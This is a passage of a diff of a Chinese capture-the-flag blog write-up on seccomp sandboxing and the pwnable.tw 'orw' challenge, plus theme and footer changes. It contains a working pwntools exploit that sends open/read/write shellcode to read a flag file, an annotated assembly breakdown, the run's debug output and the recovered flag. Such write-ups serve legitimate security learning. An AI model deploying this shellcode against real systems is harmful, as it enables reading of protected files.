class="hljs-string">'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'</span><br>shellcode = shellcode_open + shellcode_read + shellcode_write<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br>p.recvuntil(<span class="hljs-string">':'</span>)<br>p.sendline(shellcode)<br>print p.recv()<br>p.interactive()<br><br><span class="hljs-string">'''</span><br>shellcode说明：                   <br>xor eax,eax      ;清空需要用到的寄存器<br>xor ebx,ebx<br>xor ecx,ecx<br>xor edx,edx<br><br><span class="hljs-meta">#fd = open(<span class="hljs-string">'/home/orw/flag'</span>,0)</span><br>push <span class="hljs-number">0x00006761</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6c662f77</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x726f2f65</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6d6f682f</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>mov ebx, esp;              ;<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *filename<br>mov eax, <span class="hljs-number">0x5</span>;              ;open函数的系统调用：sys_open<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><br><span class="hljs-meta">#read(fd,bss+0x200,0x40)</span><br>mov ebx, eax;              ;<span class="hljs-type">int</span> fd<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x3</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><span class="hljs-meta">#write(1,bss+0x200,0x40)</span><br>mov ebx, <span class="hljs-number">0x1</span>;              ;<span class="hljs-type">int</span> fd=<span class="hljs-number">1</span> (标准输出<span class="hljs-built_in">stdout</span>)(<span class="hljs-number">0</span> 标准输入，<span class="hljs-number">1</span> 标准输出，<span class="hljs-number">2</span> 标准错误输出)<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x4</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>context.log_level=<span class="hljs-string">"debug"</span><br>p = remote(<span class="hljs-string">'chall.pwnable.tw'</span>, <span class="hljs-number">10001</span>)<br><br>shellcode_open = <span class="hljs-string">'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'</span><br>shellcode_read = <span class="hljs-string">'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'</span><br>shellcode_write = <span class="hljs-string">'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'</span><br>shellcode = shellcode_open + shellcode_read + shellcode_write<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br>p.recvuntil(<span class="hljs-string">':'</span>)<br>p.sendline(shellcode)<br>print p.recv()<br>p.interactive()<br><br><span class="hljs-string">'''</span><br>shellcode说明：                   <br>xor eax,eax      ;清空需要用到的寄存器<br>xor ebx,ebx<br>xor ecx,ecx<br>xor edx,edx<br><br><span class="hljs-meta">#fd = open(<span class="hljs-string">'/home/orw/flag'</span>,0)</span><br>push <span class="hljs-number">0x00006761</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6c662f77</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x726f2f65</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6d6f682f</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>mov ebx, esp;              ;<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *filename<br>mov eax, <span class="hljs-number">0x5</span>;              ;open函数的系统调用：sys_open<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><br><span class="hljs-meta">#read(fd,bss+0x200,0x40)</span><br>mov ebx, eax;              ;<span class="hljs-type">int</span> fd<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x3</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><span class="hljs-meta">#write(1,bss+0x200,0x40)</span><br>mov ebx, <span class="hljs-number">0x1</span>;              ;<span class="hljs-type">int</span> fd=<span class="hljs-number">1</span> (标准输出<span class="hljs-built_in">stdout</span>)(<span class="hljs-number">0</span> 标准输入，<span class="hljs-number">1</span> 标准输出，<span class="hljs-number">2</span> 标准错误输出)<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x4</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure></div>
 
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  others python orw_exp.py <br>[+] Opening connection to chall.pwnable.tw on port <span class="hljs-number">10001</span>: Done<br>[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2<span class="hljs-number">.7</span>/site-packages/pwnlib/data/includes /dev/<span class="hljs-built_in">stdin</span><br>[DEBUG] Assembling<br>    .section .shellcode,<span class="hljs-string">"awx"</span><br>    .global _start<br>    .global __start<br>    _start:<br>    __start:<br>    .intel_syntax noprefix<br>    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push <span class="hljs-number">0x00006761</span>;push <span class="hljs-number">0x6c662f77</span>;push <span class="hljs-number">0x726f2f65</span>;push <span class="hljs-number">0x6d6f682f</span>;mov ebx,esp;mov eax,<span class="hljs-number">0x5</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,eax;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x3</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,<span class="hljs-number">0x1</span>;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x4</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br>[DEBUG] /usr/bin/x86_64-linux-gnu-as <span class="hljs-number">-32</span> -o /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step2 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step1<br>[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step3 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step4<br>[DEBUG] Received <span class="hljs-number">0x17</span> bytes:<br>    <span class="hljs-string">'Give my your shellcode:'</span><br>[DEBUG] Sent <span class="hljs-number">0x4f</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">31</span> c0 <span class="hljs-number">31</span> db  <span class="hljs-number">31</span> c9 <span class="hljs-number">31</span> d2  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">2f</span>  │<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│hag·│·hw/│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">65</span>  <span class="hljs-number">2f</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">68</span>  <span class="hljs-number">2f</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>d  <span class="hljs-number">89</span> e3 b8 <span class="hljs-number">05</span>  │flhe│/orh│/hom│····│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd  <span class="hljs-number">80</span> <span class="hljs-number">89</span> c3 b9  <span class="hljs-number">60</span> a2 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  ba <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│`···│·@··│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> b8 <span class="hljs-number">03</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd <span class="hljs-number">80</span>  bb <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> b9 <span class="hljs-number">60</span> a2  │····│····│····│··`·│<br>    <span class="hljs-number">00000040</span>  <span class="hljs-number">04</span> <span class="hljs-number">08</span> ba <span class="hljs-number">40</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8  <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  cd <span class="hljs-number">80</span> <span class="hljs-number">0</span>a     │···@│····│····│···│<br>    <span class="hljs-number">0000004f</span><br>[DEBUG] Received <span class="hljs-number">0x40</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">46</span> <span class="hljs-number">4</span>c <span class="hljs-number">41</span> <span class="hljs-number">47</span>  <span class="hljs-number">7b</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span>  <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">63</span> <span class="hljs-number">30</span>  <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span>  │FLAG│&#123;sh3│llc0│ding│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">5f</span> <span class="hljs-number">77</span> <span class="hljs-number">31</span> <span class="hljs-number">74</span>  <span class="hljs-number">68</span> <span class="hljs-number">5f</span> <span class="hljs-number">6f</span> <span class="hljs-number">70</span>  <span class="hljs-number">33</span> <span class="hljs-number">6</span>e <span class="hljs-number">5f</span> <span class="hljs-number">72</span>  <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span>  │_w1t│h_op│<span class="hljs-number">3</span>n_r│<span class="hljs-number">34</span>d_│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">77</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span>  <span class="hljs-number">33</span> <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │writ│<span class="hljs-number">3</span>&#125;··│····│····│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│····│····│<br>    <span class="hljs-number">00000040</span>			<br>FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  others python orw_exp.py <br>[+] Opening connection to chall.pwnable.tw on port <span class="hljs-number">10001</span>: Done<br>[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2<span class="hljs-number">.7</span>/site-packages/pwnlib/data/includes /dev/<span class="hljs-built_in">stdin</span><br>[DEBUG] Assembling<br>    .section .shellcode,<span class="hljs-string">"awx"</span><br>    .global _start<br>    .global __start<br>    _start:<br>    __start:<br>    .intel_syntax noprefix<br>    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push <span class="hljs-number">0x00006761</span>;push <span class="hljs-number">0x6c662f77</span>;push <span class="hljs-number">0x726f2f65</span>;push <span class="hljs-number">0x6d6f682f</span>;mov ebx,esp;mov eax,<span class="hljs-number">0x5</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,eax;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x3</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,<span class="hljs-number">0x1</span>;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x4</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br>[DEBUG] /usr/bin/x86_64-linux-gnu-as <span class="hljs-number">-32</span> -o /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step2 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step1<br>[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step3 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step4<br>[DEBUG] Received <span class="hljs-number">0x17</span> bytes:<br>    <span class="hljs-string">'Give my your shellcode:'</span><br>[DEBUG] Sent <span class="hljs-number">0x4f</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">31</span> c0 <span class="hljs-number">31</span> db  <span class="hljs-number">31</span> c9 <span class="hljs-number">31</span> d2  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">2f</span>  │<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│hag·│·hw/│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">65</span>  <span class="hljs-number">2f</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">68</span>  <span class="hljs-number">2f</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>d  <span class="hljs-number">89</span> e3 b8 <span class="hljs-number">05</span>  │flhe│/orh│/hom│····│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd  <span class="hljs-number">80</span> <span class="hljs-number">89</span> c3 b9  <span class="hljs-number">60</span> a2 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  ba <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│`···│·@··│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> b8 <span class="hljs-number">03</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd <span class="hljs-number">80</span>  bb <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> b9 <span class="hljs-number">60</span> a2  │····│····│····│··`·│<br>    <span class="hljs-number">00000040</span>  <span class="hljs-number">04</span> <span class="hljs-number">08</span> ba <span class="hljs-number">40</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8  <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  cd <span class="hljs-number">80</span> <span class="hljs-number">0</span>a     │···@│····│····│···│<br>    <span class="hljs-number">0000004f</span><br>[DEBUG] Received <span class="hljs-number">0x40</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">46</span> <span class="hljs-number">4</span>c <span class="hljs-number">41</span> <span class="hljs-number">47</span>  <span class="hljs-number">7b</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span>  <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">63</span> <span class="hljs-number">30</span>  <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span>  │FLAG│&#123;sh3│llc0│ding│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">5f</span> <span class="hljs-number">77</span> <span class="hljs-number">31</span> <span class="hljs-number">74</span>  <span class="hljs-number">68</span> <span class="hljs-number">5f</span> <span class="hljs-number">6f</span> <span class="hljs-number">70</span>  <span class="hljs-number">33</span> <span class="hljs-number">6</span>e <span class="hljs-number">5f</span> <span class="hljs-number">72</span>  <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span>  │_w1t│h_op│<span class="hljs-number">3</span>n_r│<span class="hljs-number">34</span>d_│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">77</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span>  <span class="hljs-number">33</span> <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │writ│<span class="hljs-number">3</span>&#125;··│····│····│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│····│····│<br>    <span class="hljs-number">00000040</span>			<br>FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <br></code></pre></td></tr></tbody></table></figure></div>
 
 <h2 id="prctl是否能绕过？"><a href="#prctl是否能绕过？" class="headerlink" title="prctl是否能绕过？"></a>prctl是否能绕过？</h2><p>可以，但是不会</p>
 
-    </div>
+		</div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/orw/" rel="tag"># orw</a>
-          </div>
-
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> prctl-seccomp-orw</li>
+        <li><strong>作者:</strong> Kylinxin</li>
+        <li><strong>创建于
+                :</strong> 2023-07-23 15:14:29</li>
         
+            <li>
+                <strong>更新于
+                    :</strong> 2023-07-23 15:14:29
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://kylinxin.github.io/2023/07/23/prctl-seccomp/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2023/07/16/Tcache%20Attack%E7%9A%84Tcache%20dup/" rel="prev" title="Tcache Attack中的Tcache dup（基础）">
-                  <i class="fa fa-angle-left"></i> Tcache Attack中的Tcache dup（基础）
-                </a>
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/orw/">#orw</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2023/07/30/Misc%20%E7%AC%94%E8%AE%B0/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">常见文件文件头和隐写术总结 CTF中Misc必备</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2023/07/16/Tcache%20Attack%E7%9A%84Tcache%20dup/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Tcache Attack中的Tcache dup（基础）</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">prctl-seccomp-orw</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E6%8E%A2%EF%BC%88Linux-Kernel%EF%BC%89sandbox%E4%B8%AD%E7%9A%84prctl-seccomp%E6%9C%BA%E5%88%B6%EF%BC%88orw%EF%BC%89"><span class="nav-text">初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl-seccomp-%E7%AE%80%E4%BB%8B"><span class="nav-text">prctl-seccomp 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8seccomp-tools%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88%E8%AF%86%E5%88%AB%E6%B2%99%E7%AE%B1%E8%A7%84%E5%88%99%EF%BC%89"><span class="nav-text">使用seccomp-tools查看可用系统调用（识别沙箱规则）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="nav-text">prctl函数原型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BPF-%E8%A7%84%E5%88%99%E4%BB%8B%E7%BB%8D"><span class="nav-text">BPF 规则介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="nav-text">开始解题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl%E6%98%AF%E5%90%A6%E8%83%BD%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="nav-text">prctl是否能绕过？</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Built with Hexo and Redefine.</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-shield-halved" style="color: #A31F34"></i>&nbsp;&nbsp;<a href="/">Kylinxin</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 60 篇文章
+                    </span>
+                    
+                        <span>
+                            共 132k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
             </div>
-            <div class="post-nav-item">
-                <a href="/2023/07/30/Misc%20%E7%AC%94%E8%AE%B0/" rel="next" title="常见文件文件头和隐写术总结 CTF中Misc必备">
